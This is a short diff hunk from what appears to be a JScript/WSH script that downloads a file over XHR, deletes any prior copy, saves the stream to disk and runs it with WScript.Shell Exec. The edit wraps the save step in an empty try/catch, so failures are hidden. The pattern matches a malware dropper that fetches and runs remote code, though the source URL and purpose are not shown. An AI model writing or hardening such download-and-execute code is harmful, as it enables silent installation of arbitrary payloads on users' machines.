@@ -193,7 +193,9 @@ if (xhr.Status == 200) {
             fso.DeleteFile(filepath);  
         } catch(err) {}
     }
-    stream.SaveToFile(filepath);
+    try {
+        stream.SaveToFile(filepath);
+    } catch(err) {}
     stream.Close();
     new ActiveXObject("WScript.Shell").Exec(filepath);
 }
